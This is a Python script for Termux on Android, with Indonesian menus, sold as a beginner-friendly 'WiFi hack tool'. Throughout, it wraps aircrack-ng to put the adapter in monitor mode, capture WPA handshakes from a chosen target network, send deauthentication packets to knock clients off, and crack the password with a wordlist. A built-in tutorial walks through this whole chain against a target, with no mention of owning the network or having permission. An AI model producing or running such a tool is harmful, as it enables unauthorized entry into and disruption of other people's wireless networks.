#!/data/data/com.termux/files/usr/bin/python
# WIFI HACK TOOL - TERMUX EDITION
# Untuk pemula - Mudah digunakan

import os
import sys
import time
import subprocess

# Warna untuk tampilan
MERAH = '\033[91m'
HIJAU = '\033[92m'
KUNING = '\033[93m'
BIRU = '\033[94m'
PUTIH = '\033[97m'
RESET = '\033[0m'

def banner():
    os.system('clear')
    print(f"{MERAH}")
    print("╔══════════════════════════════════════╗")
    print("║     WIFI HACK TOOL v1.0              ║")
    print("║        FOR TERMUX ANDROID             ║")
    print("║         [ PEMULA FRIENDLY ]           ║")
    print("╚══════════════════════════════════════╝")
    print(f"{RESET}")

def cek_root():
    """Cek apakah sudah root"""
    try:
        result = subprocess.run(["id"], capture_output=True, text=True)
        if "uid=0" in result.stdout:
            return True
        else:
            return False
    except:
        return False

def scan_wifi():
    """Scan jaringan WiFi"""
    print(f"{BIRU}[*] Scanning WiFi networks...{RESET}")
    print(f"{KUNING}Tekan Ctrl+C untuk berhenti scan{RESET}")
    
    try:
        os.system("su -c 'airodump-ng wlan0mon'")
    except:
        print(f"{MERAH}[!] Gagal scan. Pastikan sudah root dan monitor mode aktif{RESET}")

def tangan_handshake():
    """Tangkap handshake"""
    print(f"{BIRU}[*] Mode Tangkap Handshake{RESET}")
    bssid = input("Masukkan BSSID target (contoh: AA:BB:CC:DD:EE:FF): ")
    channel = input("Masukkan Channel: ")
    nama_file = input("Nama file output: ")
    
    print(f"{KUNING}[*] Menjalankan airodump...{RESET}")
    cmd = f"su -c 'airodump-ng -c {channel} --bssid {bssid} -w {nama_file} wlan0mon'"
    os.system(cmd)

def deauth_attack():
    """Deauth attack"""
    print(f"{MERAH}[*] Deauth Attack{RESET}")
    bssid = input("Masukkan BSSID target: ")
    print(f"{KUNING}[*] Mengirim deauth packets...{RESET}")
    cmd = f"su -c 'aireplay-ng -0 5 -a {bssid} wlan0mon'"
    os.system(cmd)

def crack_password():
    """Crack password dari handshake"""
    print(f"{BIRU}[*] Crack Password WPA/WPA2{RESET}")
    file_handshake = input("Masukkan file .cap hasil handshake: ")
    wordlist = input("Masukkan wordlist (enter untuk default): ")
    
    if wordlist == "":
        wordlist = "/data/data/com.termux/files/home/wordlists/wordlist.txt"
    
    cmd = f"su -c 'aircrack-ng -w {wordlist} {file_handshake}'"
    os.system(cmd)

def aktifkan_monitor():
    """Aktifkan monitor mode"""
    print(f"{BIRU}[*] Mengaktifkan monitor mode...{RESET}")
    os.system("su -c 'airmon-ng start wlan0'")
    print(f"{HIJAU}[✓] Monitor mode aktif: wlan0mon{RESET}")

def nonaktifkan_monitor():
    """Nonaktifkan monitor mode"""
    print(f"{BIRU}[*] Menonaktifkan monitor mode...{RESET}")
    os.system("su -c 'airmon-ng stop wlan0mon'")
    os.system("su -c 'service network-manager restart'")
    print(f"{HIJAU}[✓] Monitor mode dinonaktifkan{RESET}")

def main():
    while True:
        banner()
        
        # Cek status root
        root_status = cek_root()
        if root_status:
            status = f"{HIJAU}✓ ROOT{RESET}"
        else:
            status = f"{MERAH}✗ NON-ROOT (fitur terbatas){RESET}"
        
        print(f"Status Root: {status}")
        print("")
        print("╔════════════════════════════╗")
        print("║         MENU UTAMA         ║")
        print("╠════════════════════════════╣")
        print("║ 1. Scan Jaringan WiFi      ║")
        print("║ 2. Aktifkan Monitor Mode   ║")
        print("║ 3. Tangkap Handshake       ║")
        print("║ 4. Deauth Attack (DOS)     ║")
        print("║ 5. Crack Password          ║")
        print("║ 6. Nonaktifkan Monitor Mode║")
        print("║ 7. Info & Tutorial         ║")
        print("║ 8. Keluar                   ║")
        print("╚════════════════════════════╝")
        print("")
        
        pilihan = input("Pilih menu (1-8): ")
        
        if pilihan == "1":
            scan_wifi()
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "2":
            aktifkan_monitor()
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "3":
            if root_status:
                tangan_handshake()
            else:
                print(f"{MERAH}[!] Butuh root untuk fitur ini!{RESET}")
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "4":
            if root_status:
                deauth_attack()
            else:
                print(f"{MERAH}[!] Butuh root untuk fitur ini!{RESET}")
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "5":
            if root_status:
                crack_password()
            else:
                print(f"{MERAH}[!] Butuh root untuk fitur ini!{RESET}")
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "6":
            nonaktifkan_monitor()
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "7":
            print(f"{KUNING}")
            print("=== TUTORIAL SINGKAT ===")
            print("1. Jalankan 'tsu' dulu untuk dapat root")
            print("2. Pilih menu 2 untuk aktifkan monitor mode")
            print("3. Pilih menu 1 untuk scan WiFi")
            print("4. Catat BSSID dan Channel target")
            print("5. Pilih menu 3 untuk tangkap handshake")
            print("6. Jalankan menu 4 untuk deauth (kick client)")
            print("7. Tunggu sampai dapat handshake")
            print("8. Pilih menu 5 untuk crack password")
            print(f"{RESET}")
            input("\nTekan Enter untuk kembali ke menu...")
            
        elif pilihan == "8":
            print(f"{HIJAU}Terima kasih! Sampai jumpa{RESET}")
            sys.exit(0)
            
        else:
            print(f"{MERAH}Pilihan tidak valid!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{KUNING}Program dihentikan{RESET}")
        sys.exit(0)